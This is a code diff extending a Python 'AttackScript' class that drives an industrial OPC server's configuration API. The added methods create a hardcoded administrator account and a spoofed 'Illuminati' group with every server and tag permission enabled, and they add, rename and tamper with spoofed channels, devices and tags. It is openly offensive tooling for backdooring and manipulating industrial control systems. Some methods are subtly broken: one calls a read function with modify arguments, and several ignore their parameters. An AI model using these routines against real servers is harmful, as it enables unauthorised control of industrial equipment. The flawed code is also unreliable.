@@ -1099,6 +1099,8 @@ class AttackScript:
         server = self.kep_connect()
         print(json.dumps(server.get_info(), indent=4),file=sys.stdout)
 
+    ## USERS and USER GROUPS
+
     def kep_get_all_users(self):
         server = self.kep_connect()
         print(json.dumps(admin.users.get_all_users(server),indent=4),file=sys.stdout)
@@ -1120,9 +1122,76 @@ class AttackScript:
         print(json.dumps(admin.users.modify_user(server, {"common.ALLTYPES_DESCRIPTION": "TEST UPDATE", "libadminsettings.USERMANAGER_USER_GROUPNAME": "readtesting"}, "bigboi" ), indent=4))
         print(admin.users.get_user(server, "bigboi"))
 
+    def kep_add_user(self,user): ## GIVE USER NOTE THAT PASSWORD NEEDS TO BE 14 characters or more
+        server = self.kep_connect()
+        print(admin.users.add_user(server, {"common.ALLTYPES_NAME": "bigboi", "libadminsettings.USERMANAGER_USER_GROUPNAME": "Administrators", "libadminsettings.USERMANAGER_USER_PASSWORD": "SmellyBoiBoiBoi"}))
+
+    def kep_del_user(self,user): ## ADDED to delete user
+        server = self.kep_connect()
+        print(admin.users.del_user(server, "bigboi"))
+
+    def kep_add_user_group(self, UG): ### ADDED to add spoofed user group
+        server = self.kep_connect()
+        print(admin.user_groups.add_user_group(server, {"common.ALLTYPES_NAME": "Illuminati"}))
+
+    def kep_delete_user_group(self, UG): ### ADDED to delete user group
+        server = self.kep_connect()
+        print(admin.user_groups.del_user_group(server, "Illuminati"))
+
+    def kep_modify_user_group(self, UG): ### ADDED to let user modify user group to superuser
+        server = self.kep_connect()
+        print(admin.user_groups.modify_user_group(server, {"common.ALLTYPES_DESCRIPTION": "VERY SPECIAL GROUP", 
+                                                   "libadminsettings.USERMANAGER_IO_TAG_READ": "Enable", 
+                                                   "libadminsettings.USERMANAGER_GROUP_ENABLED": True,
+                                                   "libadminsettings.USERMANAGER_IO_TAG_READ": True , 
+                                                   "libadminsettings.USERMANAGER_IO_TAG_WRITE": True,
+                                                   "libadminsettings.USERMANAGER_IO_TAG_DYNAMIC_ADDRESSING": True,
+                                                   "libadminsettings.USERMANAGER_SYSTEM_TAG_READ": True,
+                                                   "libadminsettings.USERMANAGER_SYSTEM_TAG_WRITE": True,
+                                                   "libadminsettings.USERMANAGER_INTERNAL_TAG_READ": True,
+                                                   "libadminsettings.USERMANAGER_INTERNAL_TAG_WRITE": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_MANAGE_LICENSES": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_RESET_OPC_DIAGS_LOG": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_RESET_COMM_DIAGS_LOG": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_MODIFY_SERVER_SETTINGS": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_DISCONNECT_CLIENTS": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_RESET_EVENT_LOG": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_OPCUA_DOTNET_CONFIGURATION": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_CONFIG_API_LOG_ACCESS": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_REPLACE_RUNTIME_PROJECT": True,
+                                                   "libadminsettings.USERMANAGER_BROWSE_BROWSENAMESPACE": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_SECURITY": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_ERROR": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_WARNING": True,
+                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_INFO": True}, user_group="Illuminati"))
+        
+    def kep_get_all_user_groups(self): ### ADDED to get all user groups
+        server = self.kep_connect()
+        print(json.dumps(admin.user_groups.get_all_user_groups(server), indent=4))
+
+    def kep_get_single_user_group(self, UG): ### ADDED to get single user group
+        server = self.kep_connect()
+        print(json.dumps(admin.user_groups.get_user_group(server, "Illuminati"), indent=4))
+
+
+
+    ## CHANNEL AND DEVICE
+
     def kep_get_all_channels(self):
         server = self.kep_connect()
         print(json.dumps(connectivity.channel.get_all_channels(server), indent=4))
+
+    def kep_add_spoofed_channel(self): ### Added to add spoofed channel
+        server = self.kep_connect()
+        print(connectivity.channel.add_channel(server, {"common.ALLTYPES_NAME": "NotSmartMeter", "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Simulator"}))
+
+    def kep_del_spoofed_channel(self): ### Added to del spoofed channel
+        server = self.kep_connect()
+        print(connectivity.channel.del_channel(server, "NotSmartMeter"))
+
+    def kep_modify_channel(self): ### Added to modify channel
+        server = self.kep_connect()
+        print(connectivity.channel.modify_channel(server, {"PROJECT_ID": 4064171838, "common.ALLTYPES_NAME": "NotSmartMeter1"}, channel="NotSmartMeter"))
 
     def kep_get_all_devices(self,channel): # Example of a channel name is "SmartMeter"
         server = self.kep_connect()
@@ -1132,6 +1201,14 @@ class AttackScript:
         server = self.kep_connect()
         device_to_get = ".".join([channel, device])
         print(json.dumps(connectivity.device.get_device(server, device_to_get), indent=4))
+
+    def kep_modify_device(self, channel, device):
+        server = self.kep_connect()
+        device_to_get = ".".join([channel, device])
+        print(json.dumps(connectivity.device.get_device(server, "SmartMeter.Hijack", {"PROJECT_ID": 1459547795, "common.ALLTYPES_NAME": "ministicHACKED"}), indent=4))
+        
+
+    ## TAG FOR DEVICE
 
     def kep_get_full_tag_structure(self,channel, device): ## ADDED to get full tag structure
         server = self.kep_connect()
@@ -1159,6 +1236,8 @@ class AttackScript:
         device_to_get = ".".join([channel, device])
         print(json.dumps(connectivity.tag.modify_tag(server, "SmartMeter.ministicHACKED.TEST1", {"PROJECT_ID": 2330553848,  "common.ALLTYPES_NAME": "UPDATEBOI"}), indent=4))
         print(json.dumps(connectivity.tag.get_all_tags(server, device_to_get), indent=4))
+
+    ## SPOOFED DEVICE
   
     def kep_add_spoofed_device(self,channel,device):
         server = self.kep_connect()
